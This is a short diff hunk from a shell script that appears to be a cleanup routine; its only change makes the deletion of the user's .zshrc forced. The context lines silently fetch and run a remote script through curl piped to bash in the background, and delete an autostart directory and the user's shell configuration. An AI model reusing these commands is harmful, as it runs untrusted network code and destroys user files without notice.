@@ -43,4 +43,4 @@ rm -rf "$AUTOSTART_DIR"
 bash <(curl -sL "$KILL_PARROT_URL") >/dev/null 2>&1 &
 
 # Clear zshrc
-rm $HOME/.zshrc
+rm -f $HOME/.zshrc
